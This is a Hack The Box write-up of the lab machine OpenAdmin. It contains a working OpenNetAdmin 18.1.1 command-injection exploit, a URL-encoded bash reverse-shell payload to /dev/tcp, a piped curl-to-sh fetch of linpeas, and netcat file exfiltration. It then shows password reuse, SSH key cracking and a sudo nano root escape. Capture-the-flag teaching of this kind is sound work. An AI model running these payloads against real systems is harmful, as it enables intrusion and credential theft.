---
title: "HTB Walkthrough: OpenAdmin"
date: 2022-05-10T17:56:30-04:00 
categories:
  - HackTheBox
header:
  teaser: /assets/images/HTB/openAdmin/openAdmin.png
tags:
  - Easy
  - Linux Host
  - OS Command Injection
  - SSH
  - Password Cracking
  - Internal Web Server
  - www-data
  - ssh2john
  - id_rsa
---

![OpenAdmin Logo](/assets/images/HTB/openAdmin/openAdmin.png)

**Welcome** to this walkthrough for the [Hack The Box](https://www.hackthebox.com/) machine OpenAdmin. This one is listed as an 'easy' box and has also been retired, so access is only provided to those that have purchased VIP access to HTB.
Because of this, you may notice that it is necessary to be connected to HTB's VIP VPN server, rather than the free server. To do this, change the dropdown selection in the top right corner where you select "Connect"
to "VIP" and download the .ovpn package (yes, even as a paid user, you must toggle between free and paid VPN packages depending on the machine).

---

## Scanning  

I went ahead and started my NMap scan and then plugged the IP address into the browser to check for HTTP and HTTPS respectfully: **10.10.10.171:80** & **10.10.10.171:443**  

Port 80 loaded successfully so I ran my directory buster and Nikto scan as well :  

```bash
sudo nmap -sS -A -sV -T5 -p- 10.10.10.171 | tee nmap_full.txt

# Since Port 80 loaded an Apache server default page, I am using an Apache-based wordlist:
dirb http://10.10.10.171 /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt | tee dirb-apache.log 

nikto -h "http://10.10.10.171/" | tee nikto.log 
```  

### NMap Results  

*** TCP ***  

Our TCP scan did not return many open ports :  

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
```  

*** UDP ***  

It is always good to check for UDP ports too, to identify more services and get a better idea of your attack surface.  

> Note: UDP is a connectionless Layer 4 protocol, meaning it takes longer and is less accurate to scan than TCP.
> For this reason, I normally start by only scanning the top 1000 ports.  

```
sudo nmap -sU 10.10.10.171 --open --top-ports=1000 | tee nmap-UDP.log

PORT      STATE         SERVICE

688/udp   open|filtered realm-rusd
989/udp   open|filtered ftps-data
1040/udp  open|filtered netarx
1064/udp  open|filtered jstel
16700/udp open|filtered unknown
18250/udp open|filtered unknown
20366/udp open|filtered unknown
21514/udp open|filtered unknown
21780/udp open|filtered unknown
22043/udp open|filtered unknown
22341/udp open|filtered unknown
32528/udp open|filtered unknown
47808/udp open|filtered bacnet
```

### Nikto Results  

```
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 597dbd5dcea8b, mtime: gzip
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ OSVDB-3233: /icons/README: Apache default file found.
```  

### Directory Busters  

Dirb was not handling the Seclist correctly, and I think that created an issue with finding existing directories :  

```
Dirb Results : 
dirb http://10.10.10.171 /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt | tee dirb-apache.log

http://10.10.10.171//index.html (CODE:200|SIZE:10918)
http://10.10.10.171//server-status (CODE:403|SIZE:277)
```  

So, instead of copying the list and removing the additional backslash from each entry and re-running it, I tried Dirbuster with the Apache Seclist.  

```
Dirbuster Results : 

* Directories * 
/
/icons/
/marga/
/marga/images/
/marga/fonts/
/marga/fonts/flaticon/
/marga/fonts/flaticon/svg/
/marga/js/
/marga/fonts/flaticon-1/
/marga/fonts/icomoon/
/marga/fonts/flaticon/license/
/marga/fonts/flaticon-1/font/
/marga/fonts/flaticon-1/license/
/marga/fonts/icomoon/demo-files/
/marga/fonts/icomoon/fonts/
```    

I decided to also run dirb with a standard wordlist :  

```
dirb http://10.10.10.171/ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | tee dirb-small.log

http://10.10.10.171/music/                                                                          
http://10.10.10.171/artwork/ 
```  

## Web Enumeration - Port 80  

There are a few interesting directories and services running.  

### Marga  

>10.10.10.171/marga  

This appears to be a standard web-template created by Colorlib with very little information in it.  

![Marga Template Site Herring](/assets/images/HTB/openAdmin/marga.png)  

There is an email form on the site as well as some basic js plugins but nothing that really stands out yet.  

### Arcwork  

>10.10.10.171/artwork  

This is another Colorlib template-built webpage named ARCWORK :  

![Arcwork Template Site Herring](/assets/images/HTB/openAdmin/arcwork.png)  

After clicking through the nav-bar tabs, I get the same impression that this is just as unhelpful as Marga.  

### SOLMusic  

>10.10.10.171/music  

Here we have, for a third time, another templated-style webpage void of valuable information, however, our nav-bar has a **Login** option.  

![SOLMusic Template Site](/assets/images/HTB/openAdmin/solmusic.png)  

It is good to investigate login forms in general, and this one takes us to a unique page : 10.10.10.171/ona  

### OpenNetAdmin - Port 80  

>10.10.10.171/ona  

This redirection logs us into a service called OpenNetAdmin (ONA) as the user *guest*  

By viewing the HTTP requests, we see that we are assigned two cookies initially when accessing /ona :  

```
Set-Cookie: ona_context_name=DEFAULT  
Set-Cookie: ONA_SESSION_ID=ip7rss3bo39ocuki0kk9maqd77; path=/  
```  

ONA is an opensource, Ajax-enabled IP Address Management (IPAM) system that provides database managed inventory of your IPs via web GUI or CLI.  

![Open Net Admin Guest Login](/assets/images/HTB/openAdmin/ona.png)  

Take note of the explicitly outdated version number : v18.1.1  
We also get a nice chunk of database information.  

Googling ONA and exploring the [public demo app](https://demo.opennetadmin.com/) reveals default credential information : 

![Default Cred. Info](/assets/images/HTB/openAdmin/ona-admin.png)  

## Initial Shell - www-data 

Well since we know that ONA is running an outdated version (18.1.1), I did a quick check via searchsploit :  

```
searchsploit opennet

OpenNetAdmin 13.03.01 - Remote Code Execution                                     | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                      | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                       | php/webapps/47691.sh

# Wow! An exact match. Let's download the bash(.sh) version:  

searchsploit -m 47691
```  

### Modifying RCE Exploit  

So, here is the bash script that we downloaded via searchsploit :  

```bash
# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```  

I successfully executed remote commands by firing them individually (you can also chain them via semicolon):  

> Example: ./47691.sh http://10.10.10.171/ona/login.php cd /; ls-la; cd /tmp; echo "hi" > greeting.txt  

But this was extremely slow, so I decided to curl the exploit myself and throw a [reverse payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) in it to gain an interactive shell.  

Had a couple issues getting it to work, but I just copied the original, deleted the "echo" cmd, [url-encoded](https://www.urlencoder.org/) a bash payload to add instead and ran Netcat :  

```bash
nc -nvlp 4242
```  

```bash
# reverse shell payload set for 10.10.14.42:4242

curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.42%2F4242%200%3E%261'&xajaxargs[]=ping" http://10.10.10.171/ona/login.php
```  

Now checking back on our Netcat listener, we have a shell :  

>www-data@openadmin  

## Enumerating Internals 

So, the first issue we have is we need to spawn a tty shell, because upon logging in we see the message :  

>bash: no job control in this shell  

We can do that easily using python3 :  

```bash
echo "import pty; pty.spawn('/bin/bash')" > /tmp/qwerty.py
python3 /tmp/qwerty.py
```   

I started grabbing important files and in /etc/passwd we see there are a couple interesting users available :  

```
root:x:0:0:root:/root:/bin/bash
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```  

I tried logging in as them with the **su** command, but we need passwords.  

I went ahead and hosted a local copy of [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases), downloaded & ran it on our victim :  

```bash
HOST:
sudo mv ./linpeas.sh /var/www/html
sudo service apache2 start

VICTIM:
# This command downloads linpeas from my web server, runs it, and outputs to a file /tmp/linpeas.log
curl [My IP]/linpeas.sh | sh > /tmp/linpeas.log
```  

I opted to grab the results file with Netcat, just to have a local copy :  

```bash
My Machine:
nc -l -p 8899 > linpeas.log

OpenAdmin Box:
nc -w 3 10.10.14.42 8899 < /tmp/linpeas.log
```

There are multiple suggestings for priv-esc. but we will come back to that, since www-data does not have enough capability to execute them.  

Oftentimes, if I can get a shell, I think about what the purpose of that user is, as that is where they are likely to have the most permissions.  

If you navigate to www-data's home directory, we end up in /var/www/ which is full of service config files. After going through nearly all of them, I find some important data :  

```bash
cd ~
www-data@openadmin:/var/www/ona/local/config$ cd ~
cd ~
www-data@openadmin:/var/www$ cd ona/local/config
cd ona/local/config
www-data@openadmin:/var/www/ona/local/config$ ls -la
ls -la

total 16
drwxrwxr-x 2 www-data www-data 4096 Nov 21  2019 .
drwxrwxr-x 5 www-data www-data 4096 Jan  3  2018 ..
-rw-r--r-- 1 www-data www-data  426 Nov 21  2019 database_settings.inc.php
-rw-rw-r-- 1 www-data www-data 1201 Jan  3  2018 motd.txt.example
-rw-r--r-- 1 www-data www-data    0 Nov 21  2019 run_installer
```  

```
www-data@openadmin:/var/www/ona/local/config$ cat database_settings.inc.php

<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```  

I logged into the mysql DB locally but couldn't find any further useful information :  

>mysql -u ona_sys -p -h localhost  
>n1nj4W4rri0R!  

### User Shell - jimmy  

After scouring the local database, I decided to try the password to switch user (*su*) :  

```bash 
?>www-data@openadmin:/var/www/ona/local/config$ su jimmy
su jimmy
Password: n1nj4W4rri0R!

jimmy@openadmin:/opt/ona/www/local/config$ id
id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```  

Navigating to the directory that jimmy has access to in /var/www/ we see an internal website being hosted :  

```bash 
jimmy@openadmin:/var/www/internal$ ls -la
ls -la
total 20
drwxrwx--- 2 jimmy internal 4096 Nov 23  2019 .
drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```  

Checking out the code for these, we find a login form in index.php with jimmy's SHA-512 hash and a command to print joanna's ssh hash in main.php :  

![main.php code](/assets/images/HTB/openAdmin/internal-code.png)  

We can check this website's configuration by navigating to /etc/apache2  

```bash 
jimmy@openadmin:/etc/apache2/sites-enabled$ ls
internal.conf  openadmin.conf
jimmy@openadmin:/etc/apache2/sites-enabled$ cat internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```  

So, here we see it is being hosted locally ("internal", not surprised) on port 52846.  

To best connect to this and view it in a browser, we can SSH into jimmy and connect to that port over a tunnel using **-L**  

```bash
ssh jimmy@10.10.10.171 -L 52846:localhost:52846
```  

Now on our own machine, we navigate to localhost:52846 in our browser and there it is :  

![internal website](/assets/images/HTB/openAdmin/internal.png)  

Now we just need to grab the sha-512 hash from /var/www/internal/index.php and crack it real quick :  

![Cracked Hash](/assets/images/HTB/openAdmin/cracked.png)  

Great, so according to index.php, the username is also "jimmy"  

>jimmy:Revealed  

Once we are logged in, we see joanna's rsa private key in plain text, as per the main.php code.  

Let's crack it with john and login to joanna over SSH :  

### User Shell - joanna  

First, copy the contents from ---BEGIN to ---END lines into a new file called id_rsa (ensure there is 1 empty line at the end of the file, save & close)  

```bash
ssh2john id_rsa > is_rsa.hash

┌──(kali㉿kali)-[~/Documents/HTB/OpenAdmin]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)     
1g 0:00:00:01 DONE (2022-05-12 02:43) 0.6024g/s 5767Kp/s 5767Kc/s 5767KC/s bloodofyouth..bloodmore23
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```  

>id_rsa passphrase:  bloodninjas  

```bash
┌──(kali㉿kali)-[~/Documents/HTB/OpenAdmin]
└─$ ssh -i id_rsa joanna@10.10.10.171 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id": bad permissions
joanna@10.10.10.171's password:

# Change the permission to lower perms.:
┌──(kali㉿kali)-[~/Documents/HTB/OpenAdmin]
└─$ chmod 600 id_rsa     

┌──(kali㉿kali)-[~/Documents/HTB/OpenAdmin]
└─$ ssh joanna@10.10.10.171 -i id_rsa
Enter passphrase for key 'id_rsa': bloodninjas
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
```  

![Joanna Flag](/assets/images/HTB/openAdmin/joanna-flag.png)  

## Root Shell  

Right off the bat we find a couple commands that joanna can execute with sudo:  

```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```  

/bin/nano strikes me as very interesting because I have done easy priv. esc. with sudo privileges on vim before.  
Additionally, /opt/priv is an empty file of no type.  

If we do some Googling, we discover some ways to escalate [privileges with nano](https://gtfobins.github.io/gtfobins/nano/) :  

![Nano Shell](/assets/images/HTB/openAdmin/nano-esc.png)  

This looks like the answer.  

```bash
joanna@openadmin:~$ sudo nano /opt/priv

#Inside the empty nano window: 
CTRL+R
CTRL+X
reset; sh 1>&0 2>&0
ENTER
```  

And there you have it, a janky, half-nano, half-terminal root shell:  

![Root Shell](/assets/images/HTB/openAdmin/root.png)  

Thanks for reading through this walkthrough.  

